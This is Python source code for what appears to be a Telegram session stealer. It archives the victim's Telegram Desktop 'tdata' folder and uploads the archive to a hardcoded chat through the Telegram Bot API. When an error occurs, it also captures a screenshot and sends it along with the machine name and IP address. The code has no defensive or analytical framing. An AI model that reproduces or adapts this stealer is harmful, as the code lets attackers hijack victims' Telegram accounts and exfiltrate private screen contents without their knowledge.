import requests
import os
import zipfile
import threading
import time
import sys
from io import BytesIO
from PIL import ImageGrab

def send_message_to_group(chat_id, screenshot):
    url = f"https://api.telegram.org/bot{telegram_bot_token}/sendPhoto"
    data = {'chat_id': chat_id, 'caption': f"System Name: {system_name}\nIP Address: {ip}"}
    image_buffer = BytesIO()
    screenshot.save(image_buffer, format='JPEG')
    image_buffer.seek(0)
    files = {'photo': ('screenshot.jpg', image_buffer)}
    response = requests.post(url, data=data, files=files)

def create_zip_archive(source_dir, output_zip):
    try:
        with zipfile.ZipFile(output_zip + '.zip', 'w', compression=zipfile.ZIP_LZMA, compresslevel=9) as zipf:
            pass
        with zipfile.ZipFile(output_zip + '.zip', 'a') as zipf:
            for root, _, files in os.walk(source_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    if "user_data" in file_path or "webview" in file_path or "temp" in file_path or "emoji" in file_path or "shortcuts-default.json" in file_path:
                        continue
                    try:
                        zipf.write(file_path, os.path.relpath(file_path, source_dir))
                    except Exception as e:
                        handle_error(e)
        return output_zip + '.zip'
    except Exception as e:
        handle_error(e)
        return None

def send_file_to_telegram(file_path, file_name):
    url = f'https://api.telegram.org/bot{telegram_bot_token}/sendDocument'
    files = {'document': (file_name, open(file_path, 'rb'))}
    data = {'chat_id': 1882056354}  # Отправляем файл только в чат с айди 1882056354
    response = requests.post(url, files=files, data=data)
    if response.status_code != 200:
        print(f"Error sending file to Telegram. Chat ID: 1882056354. Status code: {response.status_code}")
        print(response.text)

def archive_and_send():
    source_dir = user + '\\AppData\\Roaming\\Telegram Desktop\\tdata'
    temp_dir = os.path.join(os.getcwd(), 'temp')
    if not os.path.exists(temp_dir):
        os.makedirs(temp_dir)
    output_zip = os.path.join(temp_dir, 'Mraks_By_sx180')
    created_zip = create_zip_archive(source_dir, output_zip)
    if created_zip:
        send_file_to_telegram(created_zip, 'Mraks_By_sx180.zip')
    else:
        print("Failed to create or send zip file.")

def handle_error(e):
    screenshot = ImageGrab.grab()
    send_message_to_group(1882056354, screenshot)
    time.sleep(10)
    print(f"Error: {str(e)}")

thread = threading.Thread(target=archive_and_send)
thread.start()
time.sleep(20)

if thread.is_alive():
    print("Архивирование и отправка занимают больше времени. Принудительно завершаем.")
    thread.join()

